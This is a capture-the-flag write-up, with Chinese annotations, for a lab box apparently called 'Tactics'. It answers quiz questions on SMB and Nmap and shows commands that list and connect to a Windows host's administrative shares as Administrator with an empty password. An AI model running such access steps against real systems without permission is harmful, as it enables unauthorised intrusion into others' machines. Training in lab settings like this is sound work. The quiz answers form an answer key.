<center>Tactics</center>



[toc]







## Tactics

> Tactics







### 1. task

1. Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?

```shell
-Pn
```

2. What does the 3-letter acronym SMB stand for?

```shell
Server Message Block
```

3. What port does SMB use to operate at?

```shell
445
```

4. What command line argument do you give to `smbclient` to list available shares?

```shell
-L
```

5. What character at the end of a share name indicates it's an administrative share?

```shell
$
```

6. Which Administrative share is accessible on the box that allows users to view the whole file system?

```shell
C$
```

7. What command can we use to download the files we find on the SMB Share?

```shell
get
```

8. Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?

```shell
psexec.py
```







### 3. flag

> 获取flag

```shell
nmap -sC -Pn IP
```

![image-20241202162102651](./assets/image-20241202162102651.png)

> 使用**`空密码列出Administrator账号下的共享`**

```shell
smbclient -L 10.129.251.55 -U Administrator
```

![image-20241202162201336](./assets/image-20241202162201336.png)

```shell
ADMIN$ --- 管理共享是由 Windows NT系列操作系统创建的隐藏网络共享，它允许系统管理员远程访问网络连接系统上的每个磁盘卷。这些共享不能被永久删除，但可以被禁用。
C$ --- C:\磁盘卷的管理共享。这是操作系统托管的地方。
IPC$ --- 进程间通信共享。通过命名管道用于进程间通信，不属于文件系统的一部分。
```

> 连接C$共享

```shell
smbclient \\\\IP\\C$ -U Administrator
```

![image-20241202162421731](./assets/image-20241202162421731.png)





